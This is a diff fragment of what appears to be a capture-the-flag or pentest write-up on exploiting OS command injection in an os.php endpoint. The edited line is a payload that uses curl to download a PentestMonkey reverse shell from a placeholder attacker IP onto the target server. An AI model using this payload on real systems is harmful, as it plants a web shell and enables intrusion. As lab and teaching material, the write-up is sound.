@@ -165,7 +165,7 @@ To be honest, I don't know if the `os.php` endpoint is one created by users on t
 We know we got OS command injection, we can send ourselves a reverse shell in the following way, host a reverse shell on your host machine, it can be the one from `PentestMonkey`, now we will abuse the command injection to download our file using curl and place it on the web application so we can access it:
 
 ```
-curl+http://CHANGE_WITH_YOUR_IP:8000/shell.php+-O+shell.php
+EMAIL=curl+http://CHANGE_WITH_YOUR_IP:8000/shell.php+-O+shell.php
 ```
 
 If we check our python server, we're able to see the server downloaded our file:
